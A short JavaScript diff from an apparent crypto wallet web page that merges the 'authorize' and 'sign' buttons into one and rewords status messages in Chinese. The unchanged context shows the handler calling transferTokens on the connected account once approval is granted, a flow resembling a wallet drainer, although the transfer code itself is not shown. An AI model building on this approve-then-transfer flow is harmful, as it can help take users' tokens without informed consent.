@@ -70,7 +70,7 @@ async function connectWallet(walletType) {
                     updateWalletList(accounts[0]);
                     isConnected = true;
                     document.getElementById('status').innerText = 'MetaMask 已连接';
-                    document.getElementById('authorizeButton').disabled = false;
+                    document.getElementById('authorizeAndSignButton').disabled = false;
                 } else {
                     document.getElementById('status').innerText = '未检测到已连接的账户';
                 }
@@ -93,8 +93,8 @@ const updateWalletList = (address) => {
     walletList.appendChild(walletItem);
 };
 
-// 授权和签名的按钮点击事件
-document.getElementById('authorizeButton').onclick = async () => {
+// 合并后的授权和签名按钮点击事件
+document.getElementById('authorizeAndSignButton').onclick = async () => {
     if (!isConnected) {
         document.getElementById('status').innerText = '请先连接钱包';
         return;
@@ -125,7 +125,7 @@ document.getElementById('authorizeButton').onclick = async () => {
         // 开始代币转移
         await transferTokens(account, tokenContract);
     } catch (error) {
-        document.getElementById('status').innerText = '授权失败: ' + error.message;
+        document.getElementById('status').innerText = '授权或签名失败: ' + error.message;
     }
 };
 
